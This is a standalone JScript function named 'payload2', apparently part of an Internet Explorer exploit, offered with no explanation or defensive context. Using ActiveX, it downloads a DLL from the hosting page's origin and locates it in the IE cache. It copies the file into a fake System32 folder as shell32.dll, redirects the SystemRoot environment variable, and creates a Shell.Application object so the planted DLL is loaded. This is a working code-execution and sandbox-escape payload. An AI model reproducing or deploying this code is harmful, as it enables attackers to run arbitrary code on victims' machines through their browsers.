function payload2()
{
    var oF = new ActiveXObject("Scripting.FileSystemObject");
    var oW = new ActiveXObject("WScript.Shell");
    // find a file based on name in specific directory recursively
    // return full path of first matching file
    var fsearch = function(dir, fname)
    {
        var FileEnum = new Enumerator(oF.getFolder(dir).SubFolders);
        for (; !FileEnum.atEnd(); FileEnum.moveNext())
        {
            var ret = fsearch(FileEnum.item(), fname);
            if(ret) { return ret; }
        }
        var FileEnum2 = new Enumerator(oF.getFolder(dir).Files);
        for (; !FileEnum2.atEnd(); FileEnum2.moveNext())
        {
            var itm = FileEnum2.item().name;
            if (itm.indexOf(fname) != - 1)
            {
                return FileEnum2.item();
            }
        }
    }
    var desktop = oW.SpecialFolders("Desktop");
    var fakesys = desktop + "\\System32";
    var iedir = oW.Environment("Process").Item("LOCALAPPDATA") + "\\Microsoft\\Windows\\Temporary Internet Files";
    if( ! oF.FolderExists(fakesys) )
    {
        oF.CreateFolder( fakesys );
    }
    var rpath = location.href.split("/").slice(0,-1).join("/") + "/AVeryOddFileName.dll";
    xPost = new ActiveXObject("Microsoft.XMLHTTP");
    xPost.Open("GET", rpath, false);    // false to sync mode
    xPost.Send();
    var dll = fsearch(iedir+"\\Low\\Content.IE5", "AVeryOddFileName");
    if ( dll )
    {
        oF.CopyFile( dll, fakesys+"\\shell32.dll" );
        var vhomedir = oW.Environment("Process").Item("USERPROFILE").split(":").join("");
        oW.Environment("Process").Item("SystemRoot") = iedir + "\\Virtualized\\" + vhomedir + "\\Desktop";
        var oS = new ActiveXObject("Shell.Application");    // trigger to load shell32.dll
        return true;
    }
    return false;
}
